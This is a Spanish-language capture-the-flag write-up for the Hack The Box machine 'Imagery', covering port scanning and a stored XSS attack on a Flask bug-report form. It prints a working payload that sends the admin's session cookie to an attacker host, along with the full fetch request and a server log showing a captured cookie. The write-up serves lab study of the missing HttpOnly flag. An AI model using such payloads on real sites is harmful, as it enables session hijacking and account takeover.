---
layout: single
title: Imagery - Hack The Box
excerpt: "Imagery aloja una aplicación de galería de imágenes basada en Flask. Explotaré una vulnerabilidad de XSS persistente (stored XSS) en la función de reporte de errores para robar una cookie de administrador"
date: 2026-02-19
classes: wide
header:
  teaser: /assets/images/htb-writeup-imagery/logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
---

Imagery aloja una aplicación de galería de imágenes basada en Flask. Explotaré una vulnerabilidad de XSS persistente (stored XSS) en la función de reporte de errores para robar una cookie de administrador.

# Emumeracion

Con `nmap` buscamos los puestos abiertos y escanemos los servicios alojados

```
nmap -p- -vvv --min-rate 5000 10.129.242.164
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-19 14:46 -05
Initiating Ping Scan at 14:46
Scanning 10.129.242.164 [2 ports]
Completed Ping Scan at 14:46, 0.32s elapsed (1 total hosts)
Initiating Connect Scan at 14:46
Scanning imagery.htb (10.129.242.164) [65535 ports]
Discovered open port 22/tcp on 10.129.242.164
Completed Connect Scan at 14:46, 26.62s elapsed (65535 total ports)
Nmap scan report for imagery.htb (10.129.242.164)
Host is up, received conn-refused (0.17s latency).
Scanned at 2026-02-19 14:46:05 -05 for 27s
Not shown: 65465 filtered tcp ports (no-response)
PORT      STATE  SERVICE          REASON
22/tcp    open   ssh              syn-ack
8000/tcp  open   http-alt         syn-ack ttl 63

nmap -p 22,8000 -sCV 10.129.242.164
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-19 14:53 -05
Nmap scan report for imagery.htb (10.129.242.164)
Host is up (0.17s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http-alt Werkzeug/3.1.3 Python/3.12.7
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
```

El browser busca la IP registrada en el archivo local `/etc/hosts` si no encuentra busca en el DNS. Para eso agregamos la IP en este archivo. 

```
echo "10.129.243.164 imagery.htb" | sudo tee -a /etc/hosts
10.129.242.164 imagery.htb
```

![](/assets/images/htb-writeup-imagery/home.png)

Despues de una busqueda y  navegar por las diferentes rutas, nos registramos en `http://imagery.htb:8000/register` y logeamos `http://imagery.htb:8000/login`

# XSS 


Notamos que el formulario de tipo text area de la ruta `http://imagery.htb:8000/admin/bug_reports` es vulnerable a XSS el cual aprovecharemos para inyectar HTML y obtener la cookie del administrador. Una vez el se redirija a ver el bug que reportaremos con el HTML malicioso obtendremos la cookie.

Para eso desde nuentra maquina levantaremos un servidor en el puerto 8080 para que escuche Y ejecutaremos el siguiente HTML como payload en el formulario Bug Details.

```
python -m http.server 8080
```

```html
<img src=/ onerror="document.location='http://{ip_atacante}:8080/'+document.cookie">
```
Si obtenemos el fetch que envia el navegador, el payload final quedaria asi: 

```js
await fetch("http://imagery.htb:8000/report_bug", {
    "credentials": "include",
    "headers": {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
    },
    "referrer": "http://imagery.htb:8000/",
    "body": "{\"bugName\":\"test bug report\",\"bugDetails\":\"<img src=/ onerror=\\\"document.location='http://10.10.15.107:8080/'+document.cookie\\\">\"}",
    "method": "POST",
    "mode": "cors"
});
```
Cuando el administrador entre a ver el reporte, sera redirigido al host del atacante donde podra ver la su cookie de session.

```
python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.242.164 - - [19/Feb/2026 16:46:11] code 404, message File not found
10.129.242.164 - - [19/Feb/2026 16:46:11] "GET /session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aZeEnw.GC9hjlqO-RnfgqivZOtmhF_yJKE HTTP/1.1" 404 -
10.129.242.164 - - [19/Feb/2026 16:46:11] code 404, message File not found
10.129.242.164 - - [19/Feb/2026 16:46:11] "GET /favicon.ico HTTP/1.1" 404 -
```

Esta es una vulnerabilidad de
configuración de seguridad común que deja a la aplicación expuesta a ataques de **Cross-Site Scripting (XSS)** y secuestro de sesión. 

Al no tener la flag `HttpOnly` incluida en el encabezado `HTTP Set-Cookie` enviado por el servidor. Su función principal es bloquear el acceso de JavaScript a esa cookie específica. 

En consecuencia podremos entrar como administradores y seguir entendiendo como funciona esta APP Web